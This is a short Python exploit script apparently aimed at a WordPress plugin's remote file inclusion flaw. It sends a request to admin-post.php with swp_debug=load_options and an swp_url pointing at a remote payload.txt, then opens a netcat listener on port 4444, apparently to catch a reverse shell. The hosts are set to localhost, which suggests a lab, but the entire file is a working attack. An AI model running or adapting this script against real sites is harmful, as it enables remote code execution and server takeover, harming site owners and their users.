import subprocess
import time
import webbrowser


def foo():
    print("Hello chief! Do you want to exploit this vulnerability?")
    port = str(4444)
    yes = {'yes', 'y'}
    no = {'no', 'n'}
    choice = input().lower()
    if choice in yes:
        print("Ok. Opening port 4444.")
        time.sleep(1)
        listen(port)
        print("Connection closed.")
        return True
    elif choice in no:
        print("Understandable. Have a nice day.")
        return False
    else:
        print("Please respond with 'yes' or 'no'.")


def listen(port):
    connect_to_target()
    subprocess.run(["nc", "-l", port])


def connect_to_target():
    target_ip = "localhost:"
    target_port = str(8888)
    payload_url = "localhost:"
    payload_port = str(8888)
    payload_path = "/payload.txt"
    target_url = "http://{0}{1}/wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://{2}{3}{4}".format(
        target_ip, target_port, payload_url, payload_port, payload_path)

    print("Connecting to target...")
    time.sleep(1)
    webbrowser.open(target_url, new=0, autoraise=False)
    print("Connected to " + target_url + "\n")


foo()
